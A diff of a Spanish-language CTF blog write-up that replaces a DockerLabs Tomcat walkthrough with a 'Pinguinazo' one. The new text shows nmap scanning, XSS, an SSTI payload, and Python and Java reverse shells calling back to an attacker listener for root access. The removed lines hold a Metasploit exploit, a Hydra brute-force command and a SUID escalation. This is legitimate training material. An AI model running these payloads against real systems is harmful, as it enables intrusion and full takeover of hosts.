@@ -2,7 +2,7 @@
 layout: post
 title: Maquina Pinguinazo
 subtitle: DockerLabs
-header-img: img/in-post/2020-10-07/upload-dl.png
+header-img: img/in-post/2020-10-07/pinguinazo-dl.png
 header-style: text
 catalog: true
 tags:
@@ -26,7 +26,7 @@ Para ejecutarlo utilizamos el siguiente comando:
 ```bash
 sudo bash auto_deploy.sh pinguinazo.tar
 ```
-![Image 1](https://aanton94.github.io/blog/img/posts/dl/hiddencat/img1.png)
+![Image 1](https://aanton94.github.io/blog/img/posts/dl/pinguinazo/img1.png)
 
 **auto_deploy.sh:** este archivo se encarga de desplegar la máquina mediante docker y, una vez presionamos `ctrl+c`{:.info} pasa a un proceso de borrado, todo automático, sin necesidad de tener conocimientos de docker.
 
@@ -37,12 +37,12 @@ Lo primero que realizamos es lanzar un ping contra la IP de la máquina para com
 ```bash
 ping -c 1 172.17.0.2
 ```
-![Image 2](https://aanton94.github.io/blog/img/posts/dl/hiddencat/img2.png)
+![Image 2](https://aanton94.github.io/blog/img/posts/dl/pinguinazo/img2.png)
 
 Podemos observar que el ttl es de 64, por tanto, como norma general podemos afirmas que se trata de una maquina linux.
 Una vez comprobada la conectividad, iniciaremos un escaneo con nmap, para detectar puertos abiertos y lo almacenaremos en un fichero llamado scan, con el siguiente comando:
 ```bash
-nmap -p- --open -sV -sC -sS --min-rate=5000 -vvv -n -Pn -oN scan
+nmap -p- --open -sV -sC -sS --min-rate=5000 -vvv -n -Pn 172.17.0.2 -oN scan
 ```
 - **-p-** --> Busqueda de puertos abiertos
 - **--open** --> Enumera los puertos abiertos
@@ -53,81 +53,80 @@ nmap -p- --open -sV -sC -sS --min-rate=5000 -vvv -n -Pn -oN scan
 - **-n** --> No hace resolución DNS
 - **-Pn** --> No hace ping
 - **-vvv** --> Muestra en pantalla a medida que encuentra puertos (Verbose)
-![Image 3](https://aanton94.github.io/blog/img/posts/dl/hiddencat/img3.png)
-![Image 4](https://aanton94.github.io/blog/img/posts/dl/hiddencat/img4.png)
+![Image 3](https://aanton94.github.io/blog/img/posts/dl/pinguinazo/img3.png)
+![Image 4](https://aanton94.github.io/blog/img/posts/dl/pinguinazo/img4.png)
 
-Vemos que tiene abiertos los puertos **22 (SSH), 8080 y 8009**.
-Gracias a los scrips de nmap nos detecta lo siguiente:
--	Puerto 22: `OpenSSH 7.9p1`{:.error}
--	Puerto 8009: `Apache Jserv (Protocol v1.3)`{:.error}
--	Puerto 8080: `Apache Tomcat 9.0.30`{:.error}
+Vemos que tiene abierto el puerto **5000 (upnp?)**.
 
 #### **Explotación**
-Descartamos de momento atacar al puerto 22 ya que cuenta con una versión de OpenSSH no vulnerable, por tanto, investigamos el puerto 8009 que corre un Apache Jserv. Encontramos la siguiente referencia al respecto en [HackTriks](https://book.hacktricks.xyz/v/es/network-services-pentesting/8009-pentesting-apache-jserv-protocol-ajp), donde se detalla que versiones anteriores a 9.0.31, 8.5.51 y 7.0.100 de Apache Tomcat, si el puerto AJP está expuesto -como es el caso aquí, dado que tenemos la versión 9.0.30 y el puerto 8009 expuesto-, presentan una vulnerabilidad conocida como `Ghostcat`{:.info} (CVE-2020-1938).
+Lo primero que observamos al acceder por el puerto 5000 es un formulario de registro.
+![Image 5](https://aanton94.github.io/blog/img/posts/dl/pinguinazo/img5.png)
 
-En el propio HackTik encontramos un script en Python que permite explotar esta vulnerabilidad, yo he preferido buscarlo en `Metasploit`{:.info}.
+Si lo rellenamos, vemos que nos muestra un saludo y el nombre que hemos introducido en el primer campo.
+![Image 6](https://aanton94.github.io/blog/img/posts/dl/pinguinazo/img6.png)
 
-Arrancamos Metasploit con el comando `msfconsole`{:.info}.
-Una vez dentro buscamos los exploits que hagan referencia a Apache Jserv
-```bash
-msf6 > search exploit Apache Jserv
-```
-Encontramos el exploit `tomcat_ghostcat`{:.info}, lo seleccionamos.
-```bash
-msf6 > use 0
-```
-Y revisamos los parámetros necesarios para el exploit.
-```bash
-msf6 > show options
-```
-![Image 5](https://aanton94.github.io/blog/img/posts/dl/hiddencat/img5.png)
+Trataremos de averiguar si es vulnerable a ejecución de html injection.
+![Image 7](https://aanton94.github.io/blog/img/posts/dl/pinguinazo/img7.png)
 
-Establecemos la IP de la maquina víctima y ejecutamos el exploit.
-```bash
-msf6> set RHOST 172.17.0.2
-msf6> exploit
+En el primer campo introducimos lo siguiente:
+```html
+<script>alert("hackeado")</script>
 ```
-![Image 6](https://aanton94.github.io/blog/img/posts/dl/hiddencat/img6.png)
+Al enviarlo comprobamos que efectivamente es vulnerable.
+![Image 8](https://aanton94.github.io/blog/img/posts/dl/pinguinazo/img8.png)
 
-Podemos ver que tenemos un usuario llamado Jerry.
-Teniendo el usuario podríamos tratar de aplicar fuerza bruta para lograr acceso por SSH a la maquina víctima, ya que como nos mostró el escaneo de nmap, contamos con el Puerto 22 abierto.
-Realizamos el ataque con Hydra al usuario Jerry utilizando el diccionario de contraseñas comunes `rockyou.txt`{:.info}.
-```bash
-hydra 172.17.0.2 ssh -s 22 -l jerry -P /usr/share/wordlists/rockyou.txt -f -I -t 64
+Ahora comprobaremos si es vulnerable a SSTI (Server Side Template Injection), en el github de [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#exploit-the-ssti-by-calling-ospopenread) encontramos exploit para este tipo de vulnerabilidad.
+
+```python
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
 ```
-![Image 7](https://aanton94.github.io/blog/img/posts/dl/hiddencat/img7.png)
+![Image 9](https://aanton94.github.io/blog/img/posts/dl/pinguinazo/img9.png)
 
-Y efectivamente nos encuentra la contraseña `chocolate`{:.success} :chocolate_bar: para el usuario Jerry
-Accedemos por SSH a la maquina víctima.
+Nos muestra el siguiente mensaje:
+![Image 10](https://aanton94.github.io/blog/img/posts/dl/pinguinazo/img10.png)
 
-![Image 8](https://aanton94.github.io/blog/img/posts/dl/hiddencat/img8.png)
-Una vez dentro trato de ejecutar sudo -l para listar los privilegios que tiene el usuario “Jerry” en el sistema mediante el comando sudo. Esto significa que muestra qué comandos puede ejecutar el usuario Jerry con privilegios elevados utilizando sudo, así como cualquier restricción aplicada a esos privilegios.
-Pero nos indica que sudo no está instalado en el sistema, por tanto, pruebo a buscar los archivos con permisos SUID en el sistema.
-```bash
-jerry@a8385f5ecbd3:~$ find / -perm -4000 2>/dev/null
-/bin/ping
-/bin/su
-/bin/umount
-/bin/mount
-/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-/usr/lib/openssh/ssh-keysign
-/usr/bin/newgrp
-/usr/bin/chfn
-/usr/bin/perl5.28.1
-/usr/bin/gpasswd
-/usr/bin/passwd
-/usr/bin/perl
-/usr/bin/chsh
-/usr/bin/python3.7
-/usr/bin/python3.7m
+Ahora intentaremos ponernos en escucha por el puerto 443 con netcat, y mediante un payload modificado del github de **PayloadsAllTheThings**, trataremos de ejecutar una reverse shell
+
+```python
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_S REAM);s.connect((\"x.x.x.x\",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\", \"-i\"]);'")}}{%endif%}{% endfor %}
 ```
-Consultamos [https://gtfobins.github.io/](https://gtfobins.github.io/) para encontrar una manera de elevar privilegios con Python. Luego, ejecutamos el siguiente comando:
-```bash
-/usr/bin/python3.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
-```
-![Image 9](https://aanton94.github.io/blog/img/posts/dl/hiddencat/img9.png)
+![Image 11](https://aanton94.github.io/blog/img/posts/dl/pinguinazo/img11.png)
 
-Y efectivamente, ya somo `root`{:.error}, por lo tanto, `¡¡¡maquina vulnerada!!!`{:.success} :sunglasses::sunglasses::sunglasses:
+Recibimos la conexión y vemos que somos es usuario pinguinazo :penguin:
+
+![Image 12](https://aanton94.github.io/blog/img/posts/dl/pinguinazo/img12.png)
+
+Ahora trataremos de realizar una escalada de privilegios para poder ser root.
+Para ello, como siempre, lo primero que hacemos es revisar que comando puede ejecutar el usuario actual como sudo.
+![Image 13](https://aanton94.github.io/blog/img/posts/dl/pinguinazo/img13.png)
+
+Vemos que podemos ejecutar java con privilegios de root, por tanto, podemos crear un fichero java con una revesrse shell ([https://www.revshells.com/](https://www.revshells.com/)) que podremos ejecutar como root.
+
+```java
+public class shell {
+    public static void main(String[] args) {
+        ProcessBuilder pb = new ProcessBuilder("bash", "-c", "$@| bash -i >& /dev/tcp/172.17.0.1/4444 0>&1")
+            .redirectErrorStream(true);
+        try {
+            Process p = pb.start();
+            p.waitFor();
+            p.destroy();
+        } catch (Exception e) {}
+    }
+}
+```
+Nos ponemos en escucha con netcat, esta vez por el puerto 4444 y ejecutamos como sudo el fichero java que hemos creado.
+```bash
+sudo java rev_shell.java
+```
+![Image 14](https://aanton94.github.io/blog/img/posts/dl/pinguinazo/img14.png)
+
+Y recibimos la reverse shell siendo el usuario root.
+
+![Image 15](https://aanton94.github.io/blog/img/posts/dl/pinguinazo/img15.png)
+
+:penguin::penguin: ¡¡¡¡Así que, maquina pinguineada!!!! :penguin::penguin:
+
 
 #### **Eliminación del entorno**
 
